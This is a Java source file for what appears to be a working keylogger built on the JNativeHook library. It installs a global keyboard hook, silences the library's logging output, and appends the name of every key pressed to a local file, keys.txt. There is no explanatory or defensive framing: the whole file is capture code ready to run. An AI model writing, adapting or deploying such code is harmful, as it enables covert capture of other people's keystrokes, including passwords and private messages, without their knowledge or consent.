import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.logging.Level;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class key implements NativeKeyListener {

	private static final Path file = Paths.get("keys.txt");

	public static void main(String[] args) {

		init();

		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			System.exit(-1);
		}

		GlobalScreen.addNativeKeyListener(new key());
	}
	private static void init() {
		
		// Get the logger for "org.jnativehook" and set the level to warning.
		java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.WARNING);

		// Don't forget to disable the parent handlers.
		logger.setUseParentHandlers(false);
	}
	

	public void nativeKeyPressed(NativeKeyEvent e) {
		String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
		
		try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
				StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {
					
					writer.println(keyText);
					
				
			
		} catch (IOException ex) {
			System.exit(-1);
		}
	}

	public void nativeKeyReleased(NativeKeyEvent e) {
		
	}

	public void nativeKeyTyped(NativeKeyEvent e) {
		
	}
}

